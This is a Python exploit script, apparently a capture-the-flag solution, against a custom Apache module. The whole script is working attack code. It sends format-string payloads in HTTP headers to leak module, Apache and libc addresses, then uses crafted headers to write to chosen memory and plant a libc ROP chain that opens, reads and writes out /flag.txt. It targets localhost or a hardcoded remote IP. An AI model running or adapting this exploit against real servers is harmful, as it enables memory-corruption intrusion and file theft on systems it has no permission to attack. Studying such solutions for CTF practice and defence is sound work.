#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py
import requests

bin_file = './files/mod_warmup.so'
context(os = 'linux', arch = 'amd64')
context.log_level = 'debug'

#==========

env = Environment('local', 'remote')
env.set_item('target',  local   = {'host':'localhost', 'port':8080}, \
                        remote  = {'host':'58.229.185.61', 'port':8080})
env.select()

#==========

binf = ELF(bin_file)
ofs_dumdum          = next(binf.search(b'DUMDUM'))

libc = ELF('./files/libc.so.6')
ofs_libc_start_thread   = 0x94850 # libc.symbols['strat_thread']

#==========

def main():
    session = requests.Session()

    def sow(ofs: int):
        req = requests.Request('WACON', 'http://{host}:{port}/exp'.format(**env.target), headers={'INDEX':'%{}$p'.format(ofs)})
        s = session.prepare_request(req)
        res = session.send(s)
        return int(res.content.split(b'\n')[1], 0x10)

    req = requests.Request('WACON', 'http://{host}:{port}/exp'.format(**env.target), headers={'INDEX':'%p'})
    s = session.prepare_request(req)
    res = session.send(s)

    addr_dumdum = sow(1)
    binf.address = addr_dumdum - ofs_dumdum
    info('addr_warmup_base  = 0x{:08x}'.format(binf.address))
    addr_bss  = binf.sep_section['.bss']

    addr_apache = sow(17) - 0x5bcf8
    info('addr_apache_base  = 0x{:08x}'.format(addr_apache))

    addr_libc_start_thread = sow(79)
    libc.address = addr_libc_start_thread - ofs_libc_start_thread
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))

    def aaw(h: dict, addr: int, val: int):
        h['MANUAL{}'.format(addr)] = str(val).encode()

    def sow(h: dict, ofs: int, val: int):
        h[str(ofs).encode()] = str(val).encode()

    def poc(headers: dict):
        req = requests.Request('POC', 'http://{host}:{port}/exp?SHOOT'.format(**env.target), headers=headers)
        s = session.prepare_request(req)
        return session.send(s)

    rop = ROP(libc)
    rop.open(addr_bss, 0)
    rop.read(13, addr_bss+0x100, 0x100)
    rop.write(12, addr_bss+0x100, 0x100)
    payload = split_n(bytes(rop), 8)

    fname  = b'/flag.txt\x00'
    fname += b'\x00'*(8-len(fname)%8)
    fname = split_n(fname, 8)

    h = dict()
    for i in range(len(fname)):
        aaw(h, addr_bss+i*8, u64(fname[i]))
    for i in range(len(payload)):
        sow(h, 11+i, u64(payload[i]))
    poc(h)

if __name__=='__main__':
    main()

#==========
